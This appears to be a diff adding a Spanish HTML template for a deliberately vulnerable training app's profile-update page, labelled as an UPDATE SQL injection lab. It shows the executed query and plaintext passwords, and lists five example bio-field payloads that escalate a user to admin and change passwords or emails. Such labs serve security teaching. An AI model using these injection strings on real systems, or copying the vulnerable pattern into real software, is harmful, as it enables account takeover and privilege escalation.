@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actualizar Perfil</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .vulnerability-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+            transition: border-color 0.3s;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            background: #667eea;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: #5568d3;
+        }
+
+        .back-btn {
+            display: inline-block;
+            color: #667eea;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .back-btn:hover {
+            text-decoration: underline;
+        }
+
+        .result {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 5px;
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+        }
+
+        .query-display {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .user-data {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+
+        .user-data .highlight {
+            background: #fff3cd;
+            padding: 5px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+
+        .examples {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 5px;
+        }
+
+        .examples h3 {
+            color: #1976D2;
+            margin-bottom: 10px;
+        }
+
+        .examples code {
+            background: #263238;
+            color: #aed581;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>✏️ Actualizar Perfil</h1>
+            <span class="vulnerability-badge">UPDATE SQL Injection</span>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Vulnerabilidad:</strong> Permite modificar campos adicionales en la base de datos mediante inyección en UPDATE.
+        </div>
+
+        <form method="POST" action="/actualizar_perfil">
+            <div class="form-group">
+                <label for="user_id">ID del Usuario:</label>
+                <input type="text" id="user_id" name="user_id" placeholder="2" required>
+                <small style="color: #666;">Usuarios disponibles: 1 (admin), 2 (user1), 3 (user2), 4 (testuser)</small>
+            </div>
+
+            <div class="form-group">
+                <label for="bio">Biografía:</label>
+                <textarea id="bio" name="bio" placeholder="Escribe tu biografía aquí..." required></textarea>
+            </div>
+
+            <button type="submit" class="btn">Actualizar Perfil</button>
+        </form>
+
+        {% if result %}
+        <div class="result">
+            <h3>✅ {{ result.message }}</h3>
+
+            <div class="query-display">
+                <strong>Query ejecutada:</strong><br>
+                {{ result.query }}
+            </div>
+
+            {% if result.user %}
+            <div class="user-data">
+                <strong>Datos actualizados del usuario:</strong><br>
+                ID: {{ result.user.id }}<br>
+                Username: {{ result.user.username }}<br>
+                Email: {{ result.user.email }}<br>
+                <span class="highlight">Role: {{ result.user.role }}</span><br>
+                <span class="highlight">Password: {{ result.user.password }}</span><br>
+                Bio: {{ result.user.bio or 'Sin biografía' }}
+            </div>
+            {% endif %}
+        </div>
+        {% endif %}
+
+        <div class="examples">
+            <h3>💡 Ejemplos de Explotación:</h3>
+
+            <p><strong>1. Actualización normal:</strong></p>
+            <p>User ID: <code>2</code></p>
+            <p>Bio: <code>Esta es mi biografía normal</code></p>
+            <br>
+
+            <p><strong>2. Escalar privilegios a admin:</strong></p>
+            <p>User ID: <code>2</code></p>
+            <p>Bio: <code>hacked', role='admin</code></p>
+            <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+                Cierra el campo bio y modifica el role a admin.
+            </p>
+            <br>
+
+            <p><strong>3. Cambiar contraseña y role simultáneamente:</strong></p>
+            <p>User ID: <code>2</code></p>
+            <p>Bio: <code>pwned', password='nuevapass', role='admin</code></p>
+            <br>
+
+            <p><strong>4. Modificar email y otros campos:</strong></p>
+            <p>User ID: <code>3</code></p>
+            <p>Bio: <code>test', email='hacker@evil.com', password='hacked123</code></p>
+            <br>
+
+            <p><strong>5. Bypass usando comentarios:</strong></p>
+            <p>User ID: <code>2</code></p>
+            <p>Bio: <code>bio', role='admin'--</code></p>
+            <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+                El '--' comenta el resto de la query original.
+            </p>
+        </div>
+
+        <a href="/" class="back-btn">← Volver al inicio</a>
+    </div>
+</body>
+</html>
